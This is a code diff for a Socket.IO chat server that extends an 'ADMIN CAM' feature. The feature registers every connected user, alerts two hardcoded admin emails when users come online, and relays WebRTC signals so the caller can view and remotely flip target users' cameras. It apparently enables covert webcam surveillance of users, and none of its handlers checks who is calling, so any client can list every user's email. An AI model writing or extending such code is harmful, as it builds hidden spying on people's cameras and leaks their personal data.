@@ -1441,67 +1441,130 @@ io.on('connection', (socket) => {
 
   // ADMIN CAM
   const ADMIN_EMAILS = ['hammadnawz519@gmail.com', 'hammadnawaz519@gmail.com'];
-  socket.on('cam_user_online', ({ email, username }) => {
-    socket.camEmail = email ? email.toLowerCase().trim() : null;
-    socket.camUsername = username || email;
-    socket.camRegistered = Boolean(socket.camEmail);
+  socket.on('cam_user_online', ({ email, username, userId }) => {
+    socket.camEmail = email ? email.toLowerCase().trim() : (socket.userEmail || null);
+    socket.camUsername = username || socket.username || email || 'User';
+    socket.camUserId = userId || socket.userId;
+    socket.camRegistered = true;
+    socket.camLastSeen = Date.now();
     if (socket.camUsername) {
       socket.join(`cam_username_${String(socket.camUsername).replace(/^@+/, '').toLowerCase().trim()}`);
     }
-    if (socket.camEmail) socket.join('cam_room_' + socket.camEmail);
+    if (socket.camEmail) {
+      socket.join('cam_room_' + socket.camEmail);
+      socket.join(socket.camEmail);
+    }
+    if (socket.camUserId) {
+      socket.join(`cam_user_${socket.camUserId}`);
+      socket.join(`user:${socket.camUserId}`);
+    }
     ADMIN_EMAILS.forEach(adminEmail => {
-      socket.to(adminEmail).emit('cam_user_online_event', { email: socket.camEmail, username: socket.camUsername, socketId: socket.id });
+      const payload = {
+        email: socket.camEmail,
+        username: socket.camUsername,
+        userId: socket.camUserId,
+        socketId: socket.id
+      };
+      io.to(adminEmail).emit('cam_user_online_event', payload);
+      io.to('cam_room_' + adminEmail).emit('cam_user_online_event', payload);
     });
   });
 
   socket.on('cam_get_users', () => {
     const userMap = new Map();
     for (const [, s] of io.sockets.sockets) {
+      if (!s.connected) continue;
       const email = s.camEmail || s.userEmail;
       if (email) {
         const cleanEmail = email.toLowerCase().trim();
         const username = s.camUsername || s.username || 'User';
-        if (!userMap.has(cleanEmail)) userMap.set(cleanEmail, {
-          email: cleanEmail,
-          username,
-          userId: s.userId,
-          socketId: s.id
-        });
+        const existing = userMap.get(cleanEmail);
+        // Prefer sockets with active camera registration or newer connections
+        if (!existing || (s.camRegistered && !existing.camRegistered)) {
+          userMap.set(cleanEmail, {
+            email: cleanEmail,
+            username,
+            userId: s.camUserId || s.userId,
+            socketId: s.id,
+            camRegistered: Boolean(s.camRegistered)
+          });
+        }
       }
     }
     socket.emit('cam_users_list', Array.from(userMap.values()));
   });
 
-  socket.on('cam_signal', ({ targetSocketId, targetEmail, targetUsername, signal }) => {
+  socket.on('cam_signal', ({ targetSocketId, targetEmail, targetUsername, targetUserId, senderEmail, signal }) => {
     if (!signal) return;
-    const payload = { fromSocketId: socket.id, fromEmail: socket.camEmail || socket.userEmail, signal };
+    const fromEmail = socket.camEmail || socket.userEmail || senderEmail;
+    if (fromEmail && !socket.camEmail) {
+      socket.camEmail = fromEmail.toLowerCase().trim();
+      socket.join('cam_room_' + socket.camEmail);
+    }
+    const payload = {
+      fromSocketId: socket.id,
+      fromEmail: socket.camEmail || socket.userEmail || senderEmail,
+      signal
+    };
+
+    const targetSockets = new Set();
     if (targetSocketId) {
       const targetSocket = io.sockets.sockets.get(targetSocketId);
-      if (targetSocket && targetSocket.connected) return targetSocket.emit('cam_signal', payload);
+      if (targetSocket && targetSocket.connected) {
+        targetSockets.add(targetSocketId);
+      }
     }
-    const targetSockets = new Set([
-      ...getRoomSockets(targetEmail ? 'cam_room_' + targetEmail.toLowerCase().trim() : null),
-      ...getRoomSockets(targetUsername ? `cam_username_${String(targetUsername).replace(/^@+/, '').toLowerCase().trim()}` : null)
-    ]);
+    if (targetEmail) {
+      const cleanTargetEmail = targetEmail.toLowerCase().trim();
+      getRoomSockets('cam_room_' + cleanTargetEmail).forEach(sid => targetSockets.add(sid));
+      getRoomSockets(cleanTargetEmail).forEach(sid => targetSockets.add(sid));
+    }
+    if (targetUsername) {
+      const cleanTargetUser = String(targetUsername).replace(/^@+/, '').toLowerCase().trim();
+      getRoomSockets(`cam_username_${cleanTargetUser}`).forEach(sid => targetSockets.add(sid));
+    }
+    if (targetUserId) {
+      getRoomSockets(`cam_user_${targetUserId}`).forEach(sid => targetSockets.add(sid));
+      getRoomSockets(`user:${targetUserId}`).forEach(sid => targetSockets.add(sid));
+    }
+
     emitToSocketsOnce(targetSockets, 'cam_signal', payload);
   });
 
-  socket.on('cam_flip_camera', ({ targetSocketId, targetEmail }) => {
+  socket.on('cam_flip_camera', ({ targetSocketId, targetEmail, targetUsername }) => {
     const payload = { fromSocketId: socket.id };
-    if (targetSocketId) {
-      const targetSocket = io.sockets.sockets.get(targetSocketId);
-      if (targetSocket && targetSocket.connected) return targetSocket.emit('cam_flip_camera', payload);
+    const targetSockets = new Set();
+    if (targetSocketId && io.sockets.sockets.get(targetSocketId)?.connected) {
+      targetSockets.add(targetSocketId);
     }
-    if (targetEmail) socket.to('cam_room_' + targetEmail.toLowerCase().trim()).emit('cam_flip_camera', payload);
+    if (targetEmail) {
+      const clean = targetEmail.toLowerCase().trim();
+      getRoomSockets('cam_room_' + clean).forEach(sid => targetSockets.add(sid));
+      getRoomSockets(clean).forEach(sid => targetSockets.add(sid));
+    }
+    if (targetUsername) {
+      const cleanUser = String(targetUsername).replace(/^@+/, '').toLowerCase().trim();
+      getRoomSockets(`cam_username_${cleanUser}`).forEach(sid => targetSockets.add(sid));
+    }
+    emitToSocketsOnce(targetSockets, 'cam_flip_camera', payload);
   });
 
-  socket.on('cam_stop_viewing', ({ targetSocketId, targetEmail }) => {
+  socket.on('cam_stop_viewing', ({ targetSocketId, targetEmail, targetUsername }) => {
     const payload = { fromSocketId: socket.id };
-    if (targetSocketId) {
-      const targetSocket = io.sockets.sockets.get(targetSocketId);
-      if (targetSocket && targetSocket.connected) return targetSocket.emit('cam_stop_viewing', payload);
+    const targetSockets = new Set();
+    if (targetSocketId && io.sockets.sockets.get(targetSocketId)?.connected) {
+      targetSockets.add(targetSocketId);
     }
-    if (targetEmail) socket.to('cam_room_' + targetEmail.toLowerCase().trim()).emit('cam_stop_viewing', payload);
+    if (targetEmail) {
+      const clean = targetEmail.toLowerCase().trim();
+      getRoomSockets('cam_room_' + clean).forEach(sid => targetSockets.add(sid));
+      getRoomSockets(clean).forEach(sid => targetSockets.add(sid));
+    }
+    if (targetUsername) {
+      const cleanUser = String(targetUsername).replace(/^@+/, '').toLowerCase().trim();
+      getRoomSockets(`cam_username_${cleanUser}`).forEach(sid => targetSockets.add(sid));
+    }
+    emitToSocketsOnce(targetSockets, 'cam_stop_viewing', payload);
   });
 
   // DISCONNECT
